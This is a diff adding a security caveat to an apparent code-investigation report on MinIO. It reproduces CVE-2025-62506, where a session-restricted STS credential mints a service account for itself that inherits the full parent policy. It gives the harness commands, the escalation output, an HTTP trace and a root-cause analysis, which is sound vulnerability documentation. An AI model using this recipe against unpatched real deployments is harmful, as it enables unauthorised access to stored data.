@@ -1542,19 +1542,170 @@ time `IsAllowedSTS` [`cmd/iam.go:2242`] returns
 [`cmd/iam.go:2311-2312`] — the logical **AND** of the session-policy decision and the parent
 policy decision, i.e. the intersection. The session-policy decision is computed by
 `isAllowedBySessionPolicy` [`cmd/iam.go:2381`], which reads the embedded claim named by
-`sessionPolicyNameExtracted` [`cmd/iam.go:2136`]. (The parallel service-account helper
-`isAllowedBySessionPolicyForServiceAccount` [`cmd/iam.go:2320`] is a different, non-AssumeRole
-path.)
+`sessionPolicyNameExtracted` [`cmd/iam.go:2136`]. This intersection is enforced as shown above
+only on the **direct-action** path. A *parallel* service-account authorization helper,
+`isAllowedBySessionPolicyForServiceAccount` [`cmd/iam.go:2320`], governs a different path — the
+creation and use of service accounts by the temporary credential — and at this commit that path
+does **not** enforce the session policy, allowing a session-restricted credential to escalate
+back to the full parent policy. This bypass was observed at runtime and is documented in the
+security caveat immediately below.
 
 **Documented behavior (confirmation).** MinIO's `docs/sts/assume-role.md` states the session's
 permissions are the intersection of the assumed policy and the inline session policy and that
 the session policy cannot grant more than the parent (`:39`), with a maximum length of 2048
 bytes (`:44`).
 
-**Answer summary (Q4).** MinIO enforces the session policy: the temporary credentials can
-perform an action only if **both** the parent policy and the session policy allow it. Proven
-by runtime output — in-session PutObject/GetObject succeeded (`200`), while out-of-session
-PutObject and ListBuckets were denied (`403 AccessDenied`).
+### Security caveat: session-policy bypass via self-created service accounts (CVE-2025-62506)
+
+The intersection enforcement demonstrated above holds only for the credential's **direct** S3
+actions. At this commit (`c07e5b49d477`, 2024-11-25) there is a **second authorization path**
+that does *not* honor the session policy: a session-restricted temporary credential can create a
+**service account for itself** and, because that service account is stored with **no inline
+policy**, the service account inherits the **full parent policy** — escaping the session-policy
+restriction entirely. This is **CVE-2025-62506** (GHSA-jjjj-jwhf-8rgr, CWE-863 *Incorrect
+Authorization*, CVSS 3.1 base **8.1 High** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`), fixed
+upstream in `RELEASE.2025-10-15T17-29-55Z` (PR minio/minio#21642, commit
+`c1a49490c78e9c3ebcad86ba0662319138ace190`); the investigated commit predates that release and is
+therefore vulnerable.
+
+To exercise this second path, a harness (Go; `minio-go/v7 v7.0.80` + `madmin-go/v3 v3.0.77`,
+resolved from the module cache) obtains temporary credentials via STS `AssumeRole` with the same
+restrictive inline session policy used above —
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    { "Effect": "Allow",
+      "Action": ["s3:PutObject", "s3:GetObject"],
+      "Resource": ["arn:aws:s3:::stsbucket/*"] }
+  ]
+}
+```
+
+— then, using those restricted credentials, (a) probes the direct-action path (baseline
+containment), (b) calls `madmin` `AddServiceAccount` **for itself with no inline policy**, and
+(c) drives the newly minted service account against actions the session policy forbids. A regular
+IAM user (`basicuser`, policy `basic-only` = Get/Put on `smoke/*`) runs the same self-service-
+account step as a scope-bounding control. Producing commands:
+
+```bash
+# Canonical single-node server (binary built from source at commit c07e5b49d477):
+./minio server /tmp/blitzy/cve-repro/data --address :9100 --console-address :9101
+# Restricted STS + service-account harness (module cache; offline build):
+GOFLAGS=-mod=mod GOPROXY=off GOSUMDB=off go build -o cverepro . && ./cverepro
+```
+
+Complete, unedited program output (run repeated 4×; behavior identical every time — only the
+randomly-minted 20-character access keys differ between runs; the run shown corresponds to the
+trace and JWT decode below):
+
+```text
+=========================================================
+CVE-2025-62506 reproduction  |  MinIO commit c07e5b49d477
+=========================================================
+
+[1] STS AssumeRole OK  (session policy: PutObject/GetObject on stsbucket/* ONLY)
+    parent user            : stsparent (policy: readwrite)
+    STS temp AccessKeyId   : FE660GYHKO1F2TUC51SF
+
+[2] BASELINE — restricted STS credential, DIRECT S3 actions:
+    restricted-STS               ListBuckets => DENIED: Access Denied.
+    restricted-STS[in-session]   PutObject stsbucket/in-session.txt => ALLOWED
+    restricted-STS[out-session]  PutObject otherbucket/blocked.txt => DENIED: Access Denied.
+
+[3] AddServiceAccount(self, no inline policy) => SUCCESS  <<< minted by the RESTRICTED credential
+    new SA AccessKeyId      : 71HOVJI1I63FNFERUGHN
+
+[4] NEW SA — actions OUTSIDE the session policy:
+    new-SA                       ListBuckets => ALLOWED (3 buckets: otherbucket,smoke,stsbucket)
+    new-SA[out-session]          PutObject otherbucket/escalated.txt => ALLOWED
+
+[5] SCOPE-BOUNDING — regular IAM user 'basicuser' (policy basic-only: Get/Put on smoke/* ONLY):
+    basicuser AddServiceAccount(self) => SUCCESS, new SA AK: LQK7D39Z0348KT57WQO9
+    basic-SA[in-scope]           PutObject smoke/ok.txt => ALLOWED
+    basic-SA[out-scope]          PutObject otherbucket/should-fail.txt => DENIED: Access Denied.
+    basic-SA                     ListBuckets => DENIED: Access Denied.
+
+========================= END =========================
+```
+
+Steps `[2]` vs `[4]` are the crux: the identical actions the direct-action path **denied** to the
+restricted credential (`ListBuckets`, `PutObject otherbucket/*`) are **allowed** once routed
+through the self-created service account. The server-side HTTP trace (`mc admin trace --all
+--verbose`) confirms the service-account creation call itself succeeds with `200 OK`
+(signatures/JWT-signature redacted; the security token is retained to prove the caller was
+session-restricted):
+
+```text
+127.0.0.1:9100 PUT /minio/admin/v3/add-service-account
+127.0.0.1:9100 Authorization: AWS4-HMAC-SHA256 Credential=FE660GYHKO1F2TUC51SF/20260707//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-security-token, Signature=<redacted>
+127.0.0.1:9100 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70
+127.0.0.1:9100 X-Amz-Security-Token: eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJGRTY2MEdZSEtPMUYyVFVDNTFTRiIsImV4cCI6MTc4MzQwMjAyNSwicGFyZW50Ijoic3RzcGFyZW50Iiwic2Vzc2lvblBvbGljeSI6Ii4uLiJ9.<sig-redacted>
+127.0.0.1:9100 <BLOB>
+127.0.0.1:9100 [RESPONSE] [2026-07-07T04:27:05.428] [ Duration 40.117ms TTFB 40.106936ms ↑ 157 B  ↓ 200 B ]
+127.0.0.1:9100 200 OK
+127.0.0.1:9100 Content-Type: application/json
+127.0.0.1:9100 Content-Length: 200
+```
+
+Decoding the `X-Amz-Security-Token` (JWT header + payload; signature discarded) proves the caller
+carried the restrictive session policy at the moment it created the service account:
+
+```json
+{
+  "accessKey": "FE660GYHKO1F2TUC51SF",
+  "exp": 1783402025,
+  "parent": "stsparent",
+  "sessionPolicy": "<base64>"
+}
+```
+
+where the nested `sessionPolicy` claim base64-decodes to **exactly** the restrictive document
+above (Allow `s3:GetObject`/`s3:PutObject` on `arn:aws:s3:::stsbucket/*` only).
+
+**Root cause (`file:line`).** The escalation is the composition of two behaviors:
+
+1. **Creation is authorized by explicit-deny only.** The `AddServiceAccount` handler
+   [`cmd/admin-handlers-users.go:650`] sets the target to the requestor's parent when a
+   derived/temporary credential creates a service account for itself (`targetUser =
+   requestorParentUser`, `cmd/admin-handlers-users.go:706`). `commonAddServiceAccount` then
+   computes `denyOnly := (targetUser == cred.AccessKey || targetUser == cred.ParentUser)`
+   [`cmd/admin-handlers-users.go:2781`] — `true` for self — and evaluates the
+   `CreateServiceAccountAdminAction` permission with `DenyOnly: denyOnly`
+   [`cmd/admin-handlers-users.go:2798`]. With `DenyOnly` set, only an **explicit `Deny`** blocks
+   the call; a session policy that simply fails to *allow* the admin action does **not** deny it,
+   so the creation is permitted.
+2. **The minted account inherits the full parent policy.** Because the harness supplies no inline
+   policy, the service account is stored with the inherited-policy marker. At authorization time
+   `IsAllowedServiceAccount` [`cmd/iam.go:2140`] takes the `saPolicyClaimStr == inheritedPolicyType`
+   branch [`cmd/iam.go:2225`] and returns `isOwnerDerived || combinedPolicy.IsAllowed(parentArgs)`
+   [`cmd/iam.go:2226`] — evaluating the **parent** policy — and never reaches
+   `isAllowedBySessionPolicyForServiceAccount` [`cmd/iam.go:2320`], which is consulted only at
+   [`cmd/iam.go:2230`] when an inline service-account policy exists. The session policy is thus
+   absent from this path, whereas the direct-action path (`IsAllowedSTS`
+   [`cmd/iam.go:2242`] → intersection at [`cmd/iam.go:2311-2312`] via `isAllowedBySessionPolicy`
+   [`cmd/iam.go:2381`]) correctly enforces it — which is exactly why step `[2]` contains the
+   credential but step `[4]` does not.
+
+**Scope bounding (observed).** Step `[5]` establishes that the service account faithfully
+inherits the *parent's real policy*: `basicuser`'s self-created service account is bound to
+`basic-only` exactly (`smoke/*` allowed; `otherbucket` and `ListBuckets` denied). A **regular**
+IAM user therefore gains **no** new privilege from this path — the escalation is specific to
+credentials whose privileges were narrowed by an STS **session policy** (or an inline
+service-account policy). The Q5 guarantee for password/regular users is unaffected; see the Q5
+cross-reference note.
+
+**Answer summary (Q4).** On the **direct-action** path MinIO enforces the session policy as the
+intersection of the parent and session policies: the temporary credentials can perform an action
+only if **both** allow it — proven by runtime output, where in-session PutObject/GetObject
+succeeded (`200`) while out-of-session PutObject and ListBuckets were denied (`403 AccessDenied`).
+**However**, at this commit that guarantee does **not** extend to service accounts the temporary
+credential creates for itself: as reproduced above (CVE-2025-62506), such a service account
+inherits the full parent policy and bypasses the session-policy restriction. The complete answer
+to "can MinIO enforce the session policy on temporary credentials" is therefore: **yes for the
+credential's own direct actions, but not — at commit `c07e5b49d477` — for service accounts it
+mints for itself**, the latter being fixed upstream in `RELEASE.2025-10-15T17-29-55Z`.
 
 ---
 
@@ -1759,6 +1910,17 @@ the unprivileged caller and aborts before any mutation; and the on-disk mappings
 `AllAccessDisabled`). The root cause of the observed "cannot modify user mappings" behavior is
 the `validateAdminReq` authorization guard.
 
+**Scope note / cross-reference to Q4.** This Q5 guarantee concerns a *regular* (password/basic)
+user attempting to modify user→policy mappings, and it holds: `validateAdminReq`
+[`cmd/admin-handler-utils.go:37`] denies the unprivileged caller. It is distinct from the
+session-policy bypass documented under Q4 (CVE-2025-62506), which affects credentials that were
+*narrowed by an STS session policy* creating a **service account** for themselves — a different
+code path (`AddServiceAccount` self-creation with `DenyOnly` at
+[`cmd/admin-handlers-users.go:2781,2798`], plus inherited-policy evaluation at
+[`cmd/iam.go:2225-2226`]). The scope-bounding control in the Q4 caveat (a regular `basic-only`
+user's self-created service account remains bound to `basic-only`) confirms that this Q5 claim
+for regular users is **not** weakened by that bypass.
+
 ---
 
 ## Coverage Pass — every named item addressed
@@ -1782,6 +1944,8 @@ the `validateAdminReq` authorization guard.
 | Q4 | AssumeRole + inline session policy | temp creds minted; session policy embedded as JWT claim | `cmd/sts-handlers.go:99,104,123,127,256`; size `:89` (2048) |
 | Q4 | **In-session** PutObject/GetObject | **ALLOWED** (200) | `cmd/iam.go:2311-2312` (AND) |
 | Q4 | **Out-of-session** PutObject/ListBuckets | **DENIED** (403) | `cmd/iam.go:2242,2381,2136` |
+| Q4 | **Session-policy bypass** — restricted STS cred self-creates a service account (no inline policy) | **SUCCESS 200**; new SA inherits full parent `readwrite`; out-of-session ListBuckets + PutObject **ALLOWED** = bypass (**CVE-2025-62506**) | `cmd/admin-handlers-users.go:650,706,2781,2798`; `cmd/iam.go:2140,2225-2226,2320` |
+| Q4 | Scope-bounding control: **regular** `basic-only` user self-creates a service account | SA bound to `basic-only` exactly (`smoke/*` ALLOWED; `otherbucket`/ListBuckets **DENIED**) — regular users **not** escalated | `cmd/iam.go:2225-2226` (inherits parent's real policy) |
 | Q5 | Admin API self-attach `consoleAdmin` (+ AddUser/List/SetUserStatus) | **403 AccessDenied**, aborts pre-mutation (190µs) | `cmd/admin-handler-utils.go:37`; `cmd/auth-handler.go:189`; `cmd/admin-handlers-users.go:1908,1770,444,406` |
 | Q5 | Direct-storage into `.minio.sys` (client + server) | client "invalid characters"; server **`AllAccessDisabled`** 403 | `cmd/object-api-utils.go:60,472`; `cmd/iam-object-store.go:478,479`; `cmd/api-errors.go:764-768` |
 
@@ -1829,6 +1993,33 @@ bit-rot read path at `cmd/xl-storage.go:1875`; and `HealObject` at
 **Non-canonical values:** the Q1 KMS master key (`MINIO_KMS_SECRET_KEY`) is an
 investigation-time key and is redacted as `<base64-32-bytes>`; it does not affect the observed
 behavior. All version/banner values are from the canonical default build (Section 1).
+
+**CVE-2025-62506 — session-policy bypass via self-created service accounts (Q4).** During the
+final security pass a reproducible, undocumented bypass of STS session-policy enforcement was
+observed and is now documented in full under Q4 (see "Security caveat: session-policy bypass via
+self-created service accounts"). Metadata: **CVE-2025-62506** / **GHSA-jjjj-jwhf-8rgr**;
+**CWE-863** (*Incorrect Authorization*); CVSS 3.1 base **8.1 High**
+(`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`); fixed upstream in **`RELEASE.2025-10-15T17-29-55Z`**
+(PR minio/minio#21642, fix commit `c1a49490c78e9c3ebcad86ba0662319138ace190`). The investigated
+commit **`c07e5b49d477`** (2024-11-25) predates that release and is therefore **vulnerable**,
+which was confirmed at runtime (4 identical runs). Root cause, grounded at this commit: a
+temporary/derived credential creating a service account **for itself** is authorized with
+`DenyOnly` (`denyOnly := (targetUser == cred.AccessKey || targetUser == cred.ParentUser)`
+[`cmd/admin-handlers-users.go:2781`], passed as `DenyOnly` at [`cmd/admin-handlers-users.go:2798`]
+from the `AddServiceAccount` handler [`cmd/admin-handlers-users.go:650`], which sets
+`targetUser = requestorParentUser` at [`cmd/admin-handlers-users.go:706`]) — so only an explicit
+`Deny` blocks creation — and the resulting no-inline-policy service account is then evaluated via
+the inherited-policy branch of `IsAllowedServiceAccount`
+([`cmd/iam.go:2140`] → [`cmd/iam.go:2225-2226`], `combinedPolicy.IsAllowed(parentArgs)`), never
+reaching `isAllowedBySessionPolicyForServiceAccount` [`cmd/iam.go:2320`]. This contrasts with the
+correctly-enforced direct-action path (`IsAllowedSTS` [`cmd/iam.go:2242`] → intersection at
+[`cmd/iam.go:2311-2312`] via `isAllowedBySessionPolicy` [`cmd/iam.go:2381`]). Secret hygiene for
+the new evidence follows the same policy as the "Secret handling" note above: the request
+`Signature` and the JWT **signature** segment are redacted (`<redacted>` / `<sig-redacted>`),
+while the JWT header/payload and the ephemeral, expired `AccessKeyId` identifiers (e.g.
+`FE660GYHKO1F2TUC51SF`, `71HOVJI1I63FNFERUGHN`, minted against a local `127.0.0.1:9100` server
+that no longer exists) are retained so the trace, stdout, and JWT-decode blocks cross-reference.
+This finding adds documentation only; **no source code was changed** to observe or record it.
 
 **Repository integrity.** No MinIO source, test, config, or build file was modified. The only
 file added to the repository is this document. All servers, data directories, scripts, and
